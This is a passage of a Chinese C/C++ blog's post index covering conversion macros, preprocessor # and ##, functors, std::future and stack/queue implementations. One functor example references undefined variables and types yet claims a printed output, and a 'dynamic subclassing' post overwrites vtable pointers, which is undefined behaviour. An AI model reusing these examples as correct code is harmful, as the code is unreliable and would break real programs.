&amp;&amp; ( bHex &lt;= &#x27;9&#x27; ) ) &#123; bAscii = bHex - &#x27;0&#x27;; &#125; else if( ( bHex &gt;= &#x27;A&#x27; ) &amp;&amp; ( bHex &lt;= &#x27;F&#x27; ) ) &#123; bAscii = bHex - &#x27;7&#x27;; &#125; else if( ( bHex &gt;= &#x27;a&#x27; ) &amp;&amp; ( bHex &lt;= &#x27;f&#x27; ) ) &#123; bAscii = bHex - 0x57; &#125; else &#123; bAscii = 0xff; &#125; return bAscii;&#125; 3、把16进制转BCD值 12345678910/***************************函数名:Hex2Bcd功能描述:把16进制转BCD值参数：16进制值返回：BCD值***************************/u_8 Hex2Bcd( u_8 HexCode )&#123; return( ( HexCode % 10 ) + ( HexCode / 10 * 16 ) );&#125; 4、把BCD值转2进制 12345678910/***************************函数名:Bcd2Bin功能描述:把BCD值转2进制参数：BCD值返回：2进制值***************************/u_8 Bcd2Bin( u_8 BcdCode )&#123; return( ( ( ( BcdCode &gt;&gt; 4 ) &amp; 0x0F ) * 10 ) + ( BcdCode &amp; 0x0F )); &#125; 5、把2进制转BCD值 12345678910/***************************函数名:Bin2BCD功能描述:把2进制转BCD值参数：2进制值返回：BCD值***************************/u_8 Bin2BCD( u_8 BinCode )&#123; return( ( ( (BinCode)/10 ) &lt;&lt; 4 ) + ( (BinCode) %10 )); &#125; 6、把x值的第i位置为1 12/********把x值的第i位置为1*************/#define X_SETBIT( x , i ) ( (x) |= ( 0x1 &lt;&lt; (i) )) 7、把x值的第i位清为0 12/**********把x值的第i位清为0**********/#define X_CLRBIT( x , i ) ( (x) &amp;= ( ~( 0x01 &lt;&lt; (i) ))) 8、判断x值的第i位是否为1 12/*********判断x值的第i位是否为1**********/#define X_CHKBIT( x , i ) ( ((x) &gt;&gt; (i) ) &amp; 0x01 ) 9、x,y值中的最小值 12/*********x,y值中的最小值**********/#define X_MIN( x ,y ) (((x)&gt;(y))?(y):(x)) 10、x,y值中的最大值 12/*********x,y值中的最大值**********/#define X_MAX( x ,y ) (((x)&gt;(y))?(x):(y)) 11、取i值的低8位 12/*********取i值的低8位**********/#define GET_4_BYTE(i) (u_8)( ( (i) &amp; 0xFF ) &gt;&gt; 0 ) 12、取i值的8-16位 12/*********取i值的8-16位**********/#define GET_3_BYTE(i) (u_8)( ( (i) &amp; 0xFF00 ) &gt;&gt; 8 ) 13、取i值的16-24位 12/*********取i值的16-24位**********/#define GET_2_BYTE(i) (u_8)( ( (i) &amp; 0xFF0000 ) &gt;&gt; 16 ) 14、取i值的24-32位 12/*********取i值的24-32位**********/#define GET_1_BYTE(i) (u_8)( ( (i) &amp; 0xFF000000 ) &gt;&gt; 24 ) 15、4个字节为int型变量 12/*********4个字节为int型变量**********/#define BYTE_TO_INT( byte,byte1,byte2,byte3 ) ( (byte&lt;&lt;24) | (byte1 &lt;&lt; 16) | (byte2 &lt;&lt; 8) | byte3 ) 16、2个字节为short型变量 12/*********2个字节为short型变量**********/#define BYTE_TO_SHORT( byte ,byte1) ( (byte&lt;&lt;8) | byte1 ) 17、int型变量为4个字节 123456/*********int型变量为4个字节**********/#define INT_TO_BYTE( Val,byte ) do&#123; (byte)[0] = ((Val)&gt;&gt;24)&amp;0xff;\\ (byte)[1] = ((Val)&gt;&gt;16)&amp;0xff;\\ (byte)[2] = ((Val)&gt;&gt;8)&amp;0xff;\\ (byte)[3] = ((Val))&amp;0xff;\\ &#125;while(0) 18、short型变量为2个字节 1234/*********short型变量为2个字节**********/#define SHORT_TO_BYTE( Val ,byte) do&#123; (byte)[0] = ((Val)&gt;&gt;8)&amp;0xff;\\ (byte)[1] = (Val)&amp;0xff;\\ &#125;while(0) 19、标准时间time转换字符串输出 123456/*********标准时间time转换字符串输出**********/#define TIME_2_STR(t, str) do&#123; tm_t tmtime;\\ gmtime_r( (time_t *)&amp;t,&amp;tmtime );\\ sprintf(str,&quot;%04d-%02d-%02d %02d:%02d:%02d&quot;,1900 + tmtime.tm_year, tmtime.tm_mon + 1, \\ tmtime.tm_mday,tmtime.tm_hour, tmtime.tm_min, tmtime.tm_sec);\\ &#125;while(0) 20、IP值转换IP字符串输出 12345/*********IP值转换IP字符串输出**********/#define IPADDR_2_STR(lIp, str) do&#123; u_8 ipaddr[4];\\ memcpy (&amp;(ipaddr[0]), &amp;(lIp), 4);\\ sprintf(str,&quot;%03d.%03d.%03d.%03d&quot;,ipaddr[0],ipaddr[1],ipaddr[2],ipaddr[3]);\\ &#125;while(0) 一、字符串化操作符# # 的功能：将#后面的宏参数转化成字符串。 使用条件：只能用于有传入参数的宏定义中，且#必须置于宏定义体中的参数名前。 123456789#include&lt;stdio.h&gt;// s是宏参数#define Str(s) #s //功能：使用Str(s)将s转化为字符串int main()&#123; printf(Str(HelloWorld)); return;&#125;//输出：HelloWorld 3.对空格的处理 123#define example1(instr) #instrstringstr=example1(abc)； 将会展成：string str=&quot;abc&quot;； 🥝 a、忽略传入参数名前面和后面的空格。 1如：str=example1( abc )； 将会被扩展成 str=&quot;abc&quot;； 🥝 b、当传入参数名间存在空格时，编译器将自动连接各个子字符串，用每个子字符串中只一个空格连接，忽略多余一个空格。 1如：str=exapme1( abc def ); 将会被扩展成 str=&quot;abc def&quot;； 宏定义作为宏参数，不展开，仍然作为字符串字面信息输出。 1234567891011#include &lt;limits.h&gt;#include &lt;stdio.h&gt;#define STR(s) #s int main()&#123; // INT_MAX是某个文件中定义的宏， printf(&quot;int max: %s\\n&quot;, STR(INT_MAX)); // 输出int max: INT_MAX return 0;&#125; 二、符号连接操作符 ## ## 的功能: 将前后两个标识符连接形成一个标识符。 使用条件：只能用于有传入参数的宏定义中，且##必须置于宏定义体中的参数名前。 12345678910#include&lt;stdio.h&gt;#define Var(x) var##xint main()&#123; int Var(1)=1,Var(2)=2,Var(3)=3; printf(&quot;var1=%d\\n&quot;,var1); printf(&quot;var2=%d\\n&quot;,var2); printf(&quot;var3=%d\\n&quot;,var3); return 0;&#125; 3.注意 a、当用##连接形参时，##前后的空格可有可无。 如：#define exampleNum(n) num ## n 相当于 #define exampleNum(n) num##nb、连接后的实际参数名，必须为实际存在的参数名或是编译器已知的宏定义。连接之后只是组成了一个参数名，并没有定义，因此要求这个参数名需要是已经存在或者说已经被定义了的参数或宏定义。 c、当宏参数是另一个宏时，凡宏定义中存在#或##的地方，宏参数不会再展开。 （ 只有当前宏生效, 参数里的宏！不会生效 ！） ① 宏定义不存在’#‘和’##&#39;的情况 123456#define TOW (2) #define MUL(a,b) (a*b) printf(&quot;%d*%d=%d/n&quot;, TOW, TOW, MUL(TOW,TOW)); 这行的宏会被展开为： printf(&quot;%d*%d=%d/n&quot;, (2), (2), ((2)*(2))); MUL里的参数TOW会被展开为(2). ② 宏定义存在’#‘或’##&#39;的时候（#在上方有讲解） 12345678910111213141516171819202122232425262728#include &lt;limits.h&gt;#include &lt;stdio.h&gt; #define A 2 #define CONS(a,b) (int)(a##e##b) //ps：##放到宏参数后面相当于一个连接 无其他作用int main()&#123; // 由于A是宏，且作为宏CONS的参数，并且宏CONS##符号，所以A不能被解引用，因此上方程序编译报错。 printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error 无法展开 //printf(&quot;%d\\n&quot;, (int)(AeA)); return 0;&#125;// 报错信息如下：main.c: In function ‘main’:main.c:8:22: error: ‘AeA’ undeclared (first use in this function) 8 | printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error 无法展开 | ^main.c:5:26: note: in definition of macro ‘CONS’ 5 | #define CONS(a,b) (int)(a##e##b) //ps：##放到宏参数后面相当于一个连接 无其他作用 | ^main.c:8:22: note: each undeclared identifier is reported only once for each function it appears in 8 | printf(&quot;%d\\n&quot;, CONS(A, A)); // compile error 无法展开 | ^main.c:5:26: note: in definition of macro ‘CONS’ 5 | #define CONS(a,b) (int)(a##e##b) //ps：##放到宏参数后面相当于一个连接 无其他作用 | ^","tags":[{"name":"宏定义","slug":"宏定义","permalink":"http://example.com/tags/%E5%AE%8F%E5%AE%9A%E4%B9%89/"},{"name":"用法","slug":"用法","permalink":"http://example.com/tags/%E7%94%A8%E6%B3%95/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"动态声明子类","date":"2023-10-27T01:24:02.108Z","path":"B_Code/CPP/动态声明子类/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;iostream&gt;#include &lt;cstdlib&gt;using namespace std;class BaseClass &#123;public: BaseClass() &#123; cout&lt;&lt;&quot;BaseClass Construct&quot;&lt;&lt;endl; &#125; virtual ~BaseClass() &#123; cout&lt;&lt;&quot;BaseClass Destruct&quot;&lt;&lt;endl; &#125; virtual void TestFunction() &#123; cout&lt;&lt;&quot;BaseClass TestFunction&quot;&lt;&lt;endl; &#125;protected: int Test;&#125;; class SonClass : public BaseClass&#123;public: SonClass() &#123; cout&lt;&lt;&quot;SonClass Construct&quot;&lt;&lt;endl; &#125; virtual ~SonClass() &#123; cout&lt;&lt;&quot;SonClass Destruct&quot;&lt;&lt;endl; &#125; virtual void TestFunction() &#123; cout&lt;&lt;&quot;SonClass TestFunction&quot;&lt;&lt;endl; &#125;&#125;; typedef void *LPVOID;template&lt;class _baseClass, class _derivedClass&gt;bool DoDynamicSubclassing(_baseClass *pBaseObj)&#123; if(pBaseObj) &#123; static_assert(sizeof(_baseClass) == sizeof(_derivedClass), &quot;DynamicSubclassing to _derivedClass must not have its own members&quot;); _derivedClass _derivedClassinstance; LPVOID *pBaseVirtPtr = (LPVOID*)pBaseObj, *pDerivedVirtPtr = (LPVOID*)&amp;_derivedClassinstance; //assign the virtual ptr of the derived class *pBaseVirtPtr = *pDerivedVirtPtr; return true; &#125; return false;&#125; int main()&#123; BaseClass *Test = new BaseClass; cout &lt;&lt; *(int*)Test &lt;&lt; endl; DoDynamicSubclassing&lt;BaseClass, SonClass&gt;(Test); Test-&gt;TestFunction(); cout &lt;&lt; *(int*)Test &lt;&lt; endl; cout &lt;&lt; &quot; ————————- &quot; &lt;&lt;endl; BaseClass aaaa; cout &lt;&lt; *(int*)&amp;aaaa &lt;&lt; endl; DoDynamicSubclassing&lt;BaseClass, SonClass&gt;(&amp;aaaa); aaaa.TestFunction(); cout &lt;&lt; *(int*)&amp;aaaa &lt;&lt; endl; return 0;&#125;","tags":[{"name":"cpp","slug":"cpp","permalink":"http://example.com/tags/cpp/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"C++ 仿函数","date":"2023-10-27T01:24:02.107Z","path":"B_Code/CPP/仿函数/","text":"概述： C++ 防函数使用和说明 [toc] 仿函数顾名思义，就是”仿造函数”的意思，它并不是函数，但是却有着类似于函数的行为. 我们在编程的时候，有时候会发现这样一种情况：有一些相同的功能，会在不同的成员函数中出现. 这时候按照一般的技巧，我们会将这些相同的功能独立出来进行封装. 但是写一个公共函数的话，函数用到的一些变量就可能被迫成为公共的全局变量. 而且，仅仅为了复用这一片代码，就要单独写一个函数，也不是很好维护，这个时候就可以用仿函数了. 按照百度词条的说法：写一个简单的类，除了那些维护一个类的成员函数外，就**只是实现一个operator()**，在类实例化的时候，就将要用的，非参数的元素传入类中. 这样写的好处是： 免去了一些公共变量的全局化的维护. 可以使那些代码独立出来，以便下次复用. 这些仿函数还可以用关联，聚合，依赖的类之间的关系，与用到他们的类组合在一起，这样有利于资源的管理. 作用： 可替代函数指针，使用更加灵活 可存储状态，形成一种类似于闭包的机制 STL 提供的仿函数graph LR A(STL提供的仿函数) --> B(算术类仿函数) A --> C(关系运算符仿函数) A --> D(逻辑运算仿函数) A --> E(\"位运算函数(since C++11)\") B --> B1(plus) --> 相加 B --> B2(minus) --> 相减 B --> B3(multiplies) --> 相乘 B --> B4(divides) --> 相除 B --> B5(modulus) --> 取模 B --> B6(negate) --> 取否 C --> C1(equal_to) --> 等于 C --> C2(not_equal_to) --> 不等于 C --> C3(greater) --> 大于 C --> C4(greater_equal) --> 大于等于 C --> C5(less) --> 小于 C --> C6(less_equal) --> 小于等于 D --> D1(logical_and) --> 逻辑与 D --> D2(logical_or) --> 逻辑或 D --> D3(logical_no) --> 逻辑非 E --> E1(bit_and) --> 按位与 E --> E2(bit_or) --> 按位或 E --> E3(bit_xor) --> 按位异或 STL 中 less&lt;T&gt; 的用法示例123456789101112131415161718192021222324252627282930313233343536/* /home/muten003/CPP/functor/002.cpp*/#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std; class MyClass&#123;public: int x; int y; friend bool operator&lt;(MyClass a, MyClass b);&#125;; class Compare&#123; friend bool operator&lt;(MyClass a, MyClass b) &#123; return a.x &lt; b.x; &#125;&#125;; int main()&#123; less&lt;MyClass&gt; myclassLes; MyClass myclass[3]; myclass[0].x = 2; myclass[1].x = 1; myclass[2].x = 3; sort(myclass, myclass + 2, myclassLes); for_each(sortClass, sortClass + 3, [] (UseLessClass obj) &#123; cout &lt;&lt; obj.y &lt;&lt; &quot;:&quot; &lt;&lt; obj.x &lt;&lt; endl; &#125;);&#125; 输出： 11 2 3 使用仿函数的优点将一个个功能通过类来实现，大多数情况下会加大代码量. 仿函数也是如此，但是仿函数却有着许多优点,除了上述的有利于资源管理、有利于代码维护外,还具有这些特点 智能性：仿函数是通过仿函数类来实现的，既然是类，里面就可以储存许多变量还有其他的一些信息.我们可以利用这个特征实现许多纯的函数实现不了的功能，举个简单的例子：我若再仿函数中加入了统计调用函数次数的功能。那么在我使用仿函数的时候，就可以自动实现统计次数的功能. 所以说，更加智能。 灵活性：或者说，每个仿函数都可以有自己的类型. 由于仿函数是泛型编程的一个例证, 它可以任意 指定类型。 通常比一般函数速度更快：尤其是大量调用函数的过程中. 比如说：STL排序的时候,所需要的那个排序规则(为一个bool型的函数). 使用实例简单示例1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;using namespace std;class Compare&#123;public: bool operator()(int a, int b) &#123; return a &lt; b; &#125;&#125;;template &lt;class Function&gt;void comp(int a, int b, Function func)&#123; if (func(a, b)) &#123; cout &lt;&lt; b &lt;&lt; &quot; is bigger than &quot; &lt;&lt; a &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; a &lt;&lt; &quot; is bigger than &quot; &lt;&lt; b &lt;&lt; endl; &#125;&#125;int main()&#123; int a = 6; int b = 2; Compare com; comp(a, b, com);&#125; 与普通函数对比123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;set&gt;#include &lt;algorithm&gt;using namespace std;class CompareObject &#123;public: void operator()() &#123; cout &lt;&lt; &quot;仿函数&quot; &lt;&lt; endl; &#125; // 重载 void operator()(int number, int number2) &#123; cout &lt;&lt; &quot;仿函数&quot; &lt;&lt; endl; &#125;&#125;;// 查看c++ for_each源码自定义class ShowActionObj &#123;public: void operator()(int content) &#123; cout &lt;&lt; &quot;custom 仿函数&quot; &lt;&lt; content &lt;&lt; endl; &#125;&#125;;// 回调方式void showAction(int content) &#123; cout &lt;&lt; &quot;custom 普通函数&quot; &lt;&lt; content &lt;&lt; endl;&#125;int main() &#123; // 直接调用仿函数 CompareObject fun1; fun1(); // 以回调方式调用 set&lt;int&gt; setVar&#123; 10,20,30,40,50,60 &#125;; cout &lt;&lt; &quot;使用仿函数:&quot; &lt;&lt; endl; for_each(setVar.begin(), setVar.end(), ShowActionObj()); cout &lt;&lt; &quot;使用普通函数&quot; &lt;&lt; endl; for_each(setVar.begin(), setVar.end(), showAction); return 0;&#125; 输出如下所示： 123456789101112131415仿函数使用仿函数:custom 仿函数10custom 仿函数20custom 仿函数30custom 仿函数40custom 仿函数50custom 仿函数60使用普通函数custom 普通函数10custom 普通函数20custom 普通函数30custom 普通函数40custom 普通函数50custom 普通函数60 补充 for_eace 的源码： 1234567891011template &lt;class _InIt, class _Fn&gt;_CONSTEXPR20 _Fn for_each(_InIt _First, _InIt _Last, _Fn _Func) &#123; // perform function for each element [_First, _Last) _Adl_verify_range(_First, _Last); auto _UFirst = _Get_unwrapped(_First); const auto _ULast = _Get_unwrapped(_Last); for (; _UFirst != _ULast; ++_UFirst) &#123; _Func(*_UFirst); &#125; return _Func;&#125; 参考文章 C++仿函数_c++ 仿函数_我要精通C++的博客-CSDN博客 C++ 仿函数 - 简书","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"try-catch块","date":"2023-10-27T01:24:02.106Z","path":"B_Code/CPP/try-catch块/","text":"[toc] 说明 Try 块： 将一或多个异常处理块（catch 子句）与复合语句关联。 声明一个具名形参的 catch 子句 1try &#123; /* */ &#125; catch (const std::exception&amp; e) &#123; /* */ &#125; 声明一个无名形参的 catch 子句 1try &#123; /* */ &#125; catch (const std::exception&amp;) &#123; /* */ &#125; catch-all 处理块，可被任何异常激活 1try &#123; /* */ &#125; catch (...) &#123; /* */ &#125;","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"异常","slug":"异常","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"using 用法整理","date":"2023-10-27T01:24:02.106Z","path":"B_Code/CPP/using/","text":"[toc] 简单整理一下using的用法 一、命名空间命名空间的用法相对简单哈 123456789101112131415using namespace std;using std::cout;//////////////////////////namepsapce nsmine &#123; void cout(); namespace minedefine &#123; #define MINE &quot;mine&quot; &#125;&#125;using namespace nsmine;using nsmine::minedefine; 二、使用using起别名相当于 typedef 12typedef std::vector&lt;int&gt; intvec;using intvec = std::vector&lt;int&gt;; 以上两种写法等价。同样两种方式也都适用于函数别名的声明。如下所示： 12// 代码 2-2typedef void (*FP) (int, const std::string&amp;); 代码 2-2 使用 typedef 为 void (int, const std::string&amp;) 创建了一个别名 FP。同样我们使用using来做这个操作，函数返回类型是void，接收参数为int,const std::string&amp; 1using Fp = void (*) (int, const std::string&amp;); using的写法把别名的名字强制分离到了左边，而把别名指向的放在了右边，比较清晰，可读性比较好。比如： 123typedef std::string (Foo::* fooMemFnPtr) (const std::string&amp;); using fooMemFnPtr = std::string (Foo::*) (const std::string&amp;);","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"}]},{"title":"std::future","date":"2023-10-27T01:24:02.105Z","path":"B_Code/CPP/std/future/","text":"概述: std::future 的用法整理 [toc] 介绍 123#include &lt;future&gt;std::future &lt; T &gt; f std::future是C++11标准库（并发支持库）中的一个模板类，它表示一个异步操作的结果。当我们在多线程编程中使用异步任务时，std::future可以帮助我们在需要的时候获取任务的执行结果。std::future的一个重要特性是能够阻塞当前线程，直到异步操作完成，从而确保我们在获取结果时不会遇到未完成的操作。 成员函数 构造函数 future() noexcept: 默认构造函数。构造无共享状态的 std::future 。构造后， valid() &#x3D;&#x3D; false future( future&amp;&amp; other ) noexcept:移动构造函数。用移动语义，以 other 的共享状态构造 std::future 。构造后 other.valid() &#x3D;&#x3D; false 。 future( const future&amp; other ) = delete : 不可复制构造 (CopyConstructible) 。 析构函数 ~future(); operator&#x3D; future&amp; operator=( future&amp;&amp; other ) noexcept:释放任何共享状态并移动赋值 other 的内容给 *this 。赋值后， other.valid() &#x3D;&#x3D; false 且 this-&gt;valid() 将产生与 other.valid() 在赋值前相同的值。 future&amp; operator=( const future&amp; other ) = delete: 不可复制赋值 (CopyAssignable) 。 share() noexcept: 转移 *this 的共享状态到 std::shared_future 对象。多个 std::shared_future 对象可引用同一共享对象，调用后valid() &#x3D;&#x3D; false 。 T get(): get 方法等待直至 future 拥有合法结果并（依赖于使用哪个模板）获取它。它等效地调用 wait() 等待结果。泛型模板和二个模板特化各含单个 get 版本。 get 的三个版本仅在返回类型有别。若调用此函数前 valid() 为 false 则行为未定义。释放任何共享状态。调用此方法后valid() 为 false 。 bool valid(): 检查future是否可以共享状态。 wait(): 等待结果变得可用 wait_for wait_until 作用 异步操作的结果获取：std::future提供了一种机制，允许我们在多线程环境中安全地获取异步操作的结果。 隐藏异步操作的细节：std::future将异步操作的结果封装起来，使程序员无需关注线程同步和通信的具体实现细节。 线程同步：通过阻塞等待异步操作完成，std::future可以确保我们在继续执行其他操作之前，已经获取了所需的结果。 异常处理：std::future可以捕获异步操作中抛出的异常，并在获取结果时重新抛出，也可以在主线程中对其进行处理，从而使得异常处理更加简单。 提高性能：std::future使得我们能够更好地利用多核处理器的性能，通过并行执行任务来提高程序的执行效率。 使用场景异步任务当我们需要在后台执行一些耗时操作时，如文件读写、网络请求或计算密集型任务，std::future可以用来表示这些异步任务的结果。通过将任务与主线程分离，我们可以实现任务的并行处理，从而提高程序的执行效率。 并发控制在多线程编程中，我们可能需要等待某些任务完成后才能继续执行其他操作。通过使用std::future，我们可以实现线程之间的同步，确保任务完成后再获取结果并继续执行后续操作。 结果获取std::future提供了一种安全的方式来获取异步任务的结果。我们可以使用std::future::get()函数来获取任务的结果。此函数会阻塞当前线程，直到异步操作完成。这样，在调用get()函数时，我们可以确保已经获取到了所需的结果。如果异步操作中发生了异常，get()函数会将异常重新抛出，使得我们能够处理这些异常。 用法示例使用std::async关联异步任务使用std::async将任务与std::future关联。它创建并运行一个异步任务，并返回一个与该任务结果关联的std::future对象。 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;chrono&gt;int long_running_task() &#123; std::this_thread::sleep_for(std::chrono::seconds(3)); return 42;&#125;int main() &#123; // std::future&lt;int&gt; 声明的类型与 long_running_task 返回值类型必须一致 std::future&lt;int&gt; result_future = std::async(std::launch::async, long_running_task); // 在此处执行其他操作 int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 使用std::promise与std::future配合std::promise是另一种与std::future配合使用的方式。我们可以使用std::promise对象来显式地设置任务的结果，而std::future对象则用于获取这个结果。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;thread&gt;void long_running_task(std::promise&lt;int&gt; result_promise) &#123; // 执行长时间运行的任务 int result = 42; // 将结果设置到promise对象中 result_promise.set_value(result);&#125;int main() &#123; std::promise&lt;int&gt; result_promise; std::future&lt;int&gt; result_future = result_promise.get_future(); // 创建一个新线程，执行长时间运行的任务 std::thread task_thread(long_running_task, std::move(result_promise)); // 在此处执行其他操作 int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; task_thread.join(); return 0;&#125; 结果获取与异常处理使用std::future::get() 函数可以获取异步任务的结果。此函数会阻塞当前线程，直到异步操作完成。如果异步操作中发生了异常，get()函数会将异常重新抛出。 :warning: 注意：std::future::get()函数只能被调用一次。在调用get()之后，std::future对象将变为无效状态。 :construction: 如果需要多次访问结果，可以考虑使用std::shared_future。 123456789101112131415161718try &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125; catch (const std::exception&amp; e) &#123; std::cerr &lt;&lt; &quot;Exception caught: &quot; &lt;&lt; e.what() &lt;&lt; std::endl;&#125; catch (...) &#123; std::cerr &lt;&lt; &quot;Unknown exception caught&quot; &lt;&lt; std::endl;&#125;std::chrono::milliseconds timeout(100);std::future_status status = result_future.wait_for(timeout);if (status == std::future_status::ready) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125; else &#123; std::cerr &lt;&lt; &quot;Timeout: the task is still running&quot; &lt;&lt; std::endl;&#125; 注意事项在使用std::future时，需要注意以下几点： std::future::get()函数只能被调用一次。调用get()之后，std::future对象将变为无效状态。如果需要多次访问结果，可以考虑使用std::shared_future。 std::future对象不可拷贝，但可以通过移动构造函数或移动赋值操作符进行转移。这意味着我们不能将std::future对象存储在容器中，除非使用std::shared_future或指针包装。 当使用std::async时，默认情况下，任务可能会在当前线程上下文中执行。这取决于库实现和系统资源。若要确保任务在新线程中执行，可以使用std::launch::async标志： std::future result_future &#x3D; std::async(std::launch::async, long_running_task); 如果std::future对象在析构时仍关联着一个有效的异步操作，且该操作尚未完成，析构函数会阻塞等待操作完成。在某些情况下，这可能导致程序死锁。为了避免这个问题，可以在析构std::future对象之前显式地调用wait()、wait_for()或wait_until()函数。 虽然std::future在获取异步任务结果和线程同步方面非常有用，但它并不能解决所有并发问题。例如，std::future无法用于实现复杂的并发模式，如线程池、工作窃取等。对于这些高级并发需求，可能需要使用其他库或者自定义实现。 使用std::promise和std::future时，需要确保在调用get()之前已经设置了对应的值，否则会导致未定义的行为。这可能需要对代码进行仔细的设计和调试，以确保正确的执行顺序。 std::future对象的生命周期需要仔细管理。如果std::future对象被提前销毁，那么关联的异步任务可能会变得不可访问。因此，需要确保在异步任务完成之前保持std::future对象的有效性。 在某些情况下，使用std::future可能会导致性能下降。例如，当多个线程频繁地等待异步操作结果时，可能会导致线程阻塞和上下文切换开销。为了避免这个问题，可以考虑使用非阻塞的方式查询异步操作状态，如std::future::wait_for()和std::future::wait_until()函数。这样，我们可以在异步操作未完成时执行其他任务，提高程序的响应性和并发性能。 std::future并不适用于所有场景。例如，它不适用于需要处理多个输入或输出结果的任务，或者需要实现动态任务依赖关系的场景。在这些情况下，可能需要寻找其他并发和同步解决方案。 虽然std::future提供了异常处理机制，但需要注意的是，一旦std::future::get()函数重新抛出异常，该异常需要在调用get()的线程中进行捕获和处理。这意味着需要在主线程和其他线程中设置适当的异常处理策略，以确保程序的稳定性和健壮性。 其他std::shared_futurestd::shared_future是std::future的一个变体，允许多个线程共享同一个异步操作的结果。与std::future不同，std::shared_future对象可以被拷贝，因此可以将其存储在容器中或在多个线程之间传递。此外，std::shared_future::get()函数可以被多次调用，而不会使std::shared_future对象变为无效状态。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;thread&gt;void print_result(std::shared_future&lt;int&gt; result_future) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125;int main() &#123; std::promise&lt;int&gt; result_promise; std::shared_future&lt;int&gt; result_future = result_promise.get_future().share(); std::thread t1(print_result, result_future); std::thread t2(print_result, result_future); result_promise.set_value(42); t1.join(); t2.join(); return 0;&#125; std::future_statusstd::future_status是一个枚举类型，表示异步操作的状态。它有三个可能的值： std::future_status::ready：异步操作已完成，结果可用。 std::future_status::timeout：异步操作尚未完成，等待已超时。 std::future_status::deferred：异步操作已被延迟，尚未启动（仅当使用std::launch::deferred策略创建std::future对象时才可能出现）。 我们可以使用std::future::wait_for()和std::future::wait_until()函数查询异步操作的状态，而无需阻塞当前线程。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;future&gt;#include &lt;chrono&gt;int long_running_task() &#123; std::this_thread::sleep_for(std::chrono::seconds(3)); return 42;&#125;int main() &#123; std::future&lt;int&gt; result_future = std::async(std::launch::async, long_running_task); std::chrono::milliseconds timeout(1000); std::future_status status = result_future.wait_for(timeout); if (status == std::future_status::ready) &#123; int result = result_future.get(); std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; &#125; else &#123; std::cerr &lt;&lt; &quot;Timeout: the task is still running&quot; &lt;&lt; std::endl; &#125; // 等待任务完成，以便正确获取结果 int result = result_future.get(); std::cout &lt;&lt; &quot;Final result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; 在上面的示例中，我们使用了std::future::wait_for()函数来查询异步操作的状态。如果状态为std::future_status::ready，我们可以立即获取结果。否则，我们可以在等待期间执行其他任务，以提高程序的响应性和并发性能。最后，在退出main函数之前，我们会调用result_future.get()以确保正确获取异步操作的结果。","tags":[{"name":"cpp","slug":"cpp","permalink":"http://example.com/tags/cpp/"},{"name":"future","slug":"future","permalink":"http://example.com/tags/future/"},{"name":"std","slug":"std","permalink":"http://example.com/tags/std/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"CPP","slug":"B-Code/CPP","permalink":"http://example.com/categories/B-Code/CPP/"},{"name":"std","slug":"B-Code/CPP/std","permalink":"http://example.com/categories/B-Code/CPP/std/"}]},{"title":"队列和栈的互相实现","date":"2023-10-27T01:24:02.103Z","path":"B_Code/CPP/STL/队列和栈的互相实现/","text":"概述：1. 用队列实现栈；2. 用栈实现队列 队列: 先进先出 栈：先进后出 队列实现栈思路1. 实现12345678910111213141516171819202122232425262728293031323334class MyStack &#123;public: void Push(int val) &#123; if(queueSta.empty()) &#123; queueSta.push(val); &#125; else &#123; int cnt = queueSta.size(); queueSta.push(val); while(cnt-- &gt; 0) &#123; queueSta.push(queueSta.front()); queueSta.pop(); &#125; &#125; &#125; int Pop() &#123; int res = queueSta.front(); queueSta.pop(); return res; &#125; bool Empty() &#123;return queueSta.empty();&#125;; private: queue&lt;int&gt; queueSta;&#125;; 栈实现队列思路实现1234567891011121314151617181920212223242526class MyQueue &#123;public: void Push(int val) &#123; sta1.push(val); &#125; int Pop() &#123; if(sta2.empty()) &#123; while(!sta1.empty()) &#123; sta2.push(sta1.top()); sta1.pop(); &#125; &#125; int res = sta2.top(); sta2.pop(); return res; &#125; private: stack&lt;int&gt; 